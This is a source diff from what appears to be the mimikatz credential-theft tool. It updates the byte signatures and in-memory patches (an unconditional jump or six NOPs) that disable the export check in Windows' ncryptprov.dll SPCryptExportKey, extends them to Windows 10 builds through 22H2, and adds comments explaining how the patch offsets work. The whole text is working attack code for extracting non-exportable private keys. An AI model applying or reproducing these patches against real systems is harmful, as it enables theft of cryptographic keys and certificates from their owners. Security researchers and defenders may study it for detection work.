@@ -103,8 +103,8 @@ NTSTATUS kuhl_m_crypto_p_capi(int argc, wchar_t * argv[])
 	return STATUS_SUCCESS;
 }
 
-BYTE PATC_WALL_SPCryptExportKey_EXPORT[]	= {0xeb};
-BYTE PATC_W10_1607_SPCryptExportKey_EXPORT[]= {0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
+BYTE PATC_WALL_SPCryptExportKey_EXPORT[]	= {0xeb}; //patch to jmp (unconditional jump)
+BYTE PATC_W10_1607_SPCryptExportKey_EXPORT[]= {0x90, 0x90, 0x90, 0x90, 0x90, 0x90}; //6x NOP
 #if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
 BYTE PTRN_WI60_SPCryptExportKey[]			= {0xf6, 0x43, 0x28, 0x02, 0x0f, 0x85};
 BYTE PTRN_WNO8_SPCryptExportKey[]			= {0xf6, 0x43, 0x28, 0x02, 0x75};
@@ -116,7 +116,7 @@ BYTE PTRN_W10_1809_SPCryptExportKey[]		= {0xf6, 0x45, 0x24, 0x02, 0x0f, 0x84};
 BYTE PTRN_W10_20H2_SPCryptExportKey[]		= {0xf6, 0x45, 0x24, 0x02, 0x75, 0x46};
 BYTE PATC_WI60_SPCryptExportKey_EXPORT[]	= {0x90, 0xe9};
 KULL_M_PATCH_GENERIC CngReferences[] = {
-	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WI60_SPCryptExportKey),	PTRN_WI60_SPCryptExportKey},	{sizeof(PATC_WI60_SPCryptExportKey_EXPORT), PATC_WI60_SPCryptExportKey_EXPORT}, {4}},
+	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WI60_SPCryptExportKey),	PTRN_WI60_SPCryptExportKey},	{sizeof(PATC_WI60_SPCryptExportKey_EXPORT), PATC_WI60_SPCryptExportKey_EXPORT}, {4}}, //last parameter is offset from start of search pattern where patch will be applied
 	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WNO8_SPCryptExportKey),	PTRN_WNO8_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
 	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WI80_SPCryptExportKey),	PTRN_WI80_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
 	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WI81_SPCryptExportKey),	PTRN_WI81_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
@@ -126,8 +126,10 @@ KULL_M_PATCH_GENERIC CngReferences[] = {
 	{KULL_M_WIN_BUILD_10_1809,	{sizeof(PTRN_W10_1809_SPCryptExportKey),PTRN_W10_1809_SPCryptExportKey},{sizeof(PATC_W10_1607_SPCryptExportKey_EXPORT), PATC_W10_1607_SPCryptExportKey_EXPORT}, {4}},
 	{KULL_M_WIN_BUILD_10_1909,	{sizeof(PTRN_W10_1809_SPCryptExportKey),PTRN_W10_1809_SPCryptExportKey},{sizeof(PATC_W10_1607_SPCryptExportKey_EXPORT), PATC_W10_1607_SPCryptExportKey_EXPORT}, {4}}, //ncryptprov.dll 10.0.18362.1411
 	{KULL_M_WIN_BUILD_10_2004,	{sizeof(PTRN_W10_1607_SPCryptExportKey),PTRN_W10_1607_SPCryptExportKey},{sizeof(PATC_W10_1607_SPCryptExportKey_EXPORT), PATC_W10_1607_SPCryptExportKey_EXPORT}, {4}}, //ncryptprov.dll 10.0.19041.662
-	{KULL_M_WIN_BUILD_10_20H2,	{sizeof(PTRN_W10_20H2_SPCryptExportKey),PTRN_W10_20H2_SPCryptExportKey},{sizeof(PATC_W10_1607_SPCryptExportKey_EXPORT), PATC_W10_1607_SPCryptExportKey_EXPORT}, {4}}, //ncryptprov.dll 10.0.19041.1620
-	{KULL_M_WIN_BUILD_10_21H2,	{sizeof(PTRN_W10_1607_SPCryptExportKey),PTRN_W10_1607_SPCryptExportKey},{sizeof(PATC_W10_1607_SPCryptExportKey_EXPORT), PATC_W10_1607_SPCryptExportKey_EXPORT}, {4}}, //ncryptprov.dll 10.0.19041.1202
+	{KULL_M_WIN_BUILD_10_20H2,	{sizeof(PTRN_W10_20H2_SPCryptExportKey),PTRN_W10_20H2_SPCryptExportKey},{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}}, //ncryptprov.dll 10.0.19041.1620 or .2193
+	{KULL_M_WIN_BUILD_10_21H2,	{sizeof(PTRN_W10_20H2_SPCryptExportKey),PTRN_W10_20H2_SPCryptExportKey},{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}}, //ncryptprov.dll 10.0.19041.1620 or .2193
+	{KULL_M_WIN_BUILD_10_22H2,	{sizeof(PTRN_W10_20H2_SPCryptExportKey),PTRN_W10_20H2_SPCryptExportKey},{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}}, //ncryptprov.dll 10.0.19041.1620 or .2193
+
 };
 #elif defined _M_IX86
 BYTE PTRN_WNO8_SPCryptExportKey[]			= {0xf6, 0x41, 0x20, 0x02, 0x75};
